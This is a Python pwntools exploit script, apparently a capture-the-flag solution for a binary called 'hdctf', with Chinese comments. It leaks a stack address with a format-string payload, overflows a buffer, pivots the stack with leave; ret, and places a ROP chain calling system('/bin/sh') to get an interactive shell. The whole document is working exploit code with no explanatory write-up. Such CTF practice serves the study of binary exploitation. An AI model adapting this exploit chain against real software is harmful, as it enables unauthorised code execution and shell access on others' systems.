from pwn import * 
context.log_level = 'debug'
io = process('./hdctf')
elf = ELF('./hdctf')

shell_addr = 0x0000000000400854 
system_plt = elf.plt['system']
pop_rdi_ret = 0x00000000004008d3 
leave_ret = 0x00000000004007f2
ret = 0x00000000004005b9

payload = b'%16$p' 
io.sendline(payload)

#recv_data = io.recvuntil(b'\n').strip()
#addr_str = recv_data.split(b',')[1].decode()
#s_addr = int(addr_str, 16) - 0x60

recv_data = io.recvuntil(b'!\n').split(b',')[1].strip()
# 去除末尾的换行符
addr_str = recv_data.decode().rstrip('\nkeep on !')
print("addr_str = ",addr_str)
# 将地址转换为整数类型
s_addr = int(addr_str, 16) - 0x60
print('s_addr = ',hex(s_addr))

payload = b'b'*(0x50) + p64(s_addr) + p64(elf.symbols['main'])
pause()
io.sendline(payload)

payload = p64(0) + p64(pop_rdi_ret) + b'/bin/sh' + p64(system_plt)
print("布置 system('/bin/sh') ...")
pause()
io.sendlineafter('please show me your name: \n',payload)
print("system('/bin/sh') 已布置！")

payload =  b'b'*(0x50) + p64(s_addr) + p64(leave_ret)
#pause()
print("布置 leave ret")
io.sendline(payload)
print("leave ret 已布置！")

print("切换交互模式！")
#pause()
io.interactive()

